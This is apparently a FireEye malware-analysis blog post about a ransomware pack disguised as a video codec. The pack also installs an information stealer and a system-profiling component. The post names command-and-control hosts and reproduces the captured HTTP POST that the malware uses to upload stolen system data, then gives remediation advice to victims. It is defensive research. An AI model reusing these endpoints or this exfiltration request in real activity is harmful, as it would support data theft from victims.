I recently got an important clue how the ransom exchange takes place between a victim and cyber criminals.
One of readers who became a victim of this ransomware dropped an email to the author at the address [email protected] for his files to be recovered.
This was the response by the author:
"Transfer into account pay pal 50 dollars here email pay pal [email protected]'
Interestingly, instead of asking him for the standard $10 ransom (as mentioned in his earlier message) he asked him for $50 - typical criminal mentality, isn't it?
Unfortunately his greed doesn't end here.
This malware instance came bundled in a fake 'SWF video codec' file.
Upon execution, this setup file installs three different pieces of malware on the victim machine including this ransomware.
Trojan Encoder, the one that encrypts the user file and asks for ransom in return.
A password stealing Trojan that uploads user personal information on a remote command and control server (antivirusubdate.no-ip.biz) using an obfuscated protocol on TCP port 3460.
The last component fetches important system information like running processes, installed windows patches, the machine's netbios name, etc., and uploads it to a remote server updatecodec.freehostia.com.
This malware doesn't try to install itself permanently on the infected system so my best guess is that its sole purpose is to register zombie machines with their command and control server.
Here is the outbound communication generated by this last piece:
System information is uploaded via HTTP POST in encoded form.
POST /gate/gate.php HTTP/1.0Host: updatecodec.freehostia.comContent-Type: application/x-www-form-urlencodedConnection: Keep-AlivePragma: no-cacheUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2; .NET CLR 2.0.50727; InfoPath.1)Content-Length: 4042
So what we see here is that a malware component encrypts user files and asks for ransom money, and at the same time other components start stealing the user's personal information.
This multi-layered malware installation is another strong evidence to support my BotnetWeb theory.
Here is my advice for the victims of this malware pack.
Recover your file using recovery tool provided by Dr.Web as mentioned in Part 1
Change all login credentials which were exchanged on the infected system.
Backup your data files and re-image the infected machine.
Atif Mushtaq @ FireEye Malware Intelligence Lab
Question/Comments : research SHIFT-2 fireeye DOT COM
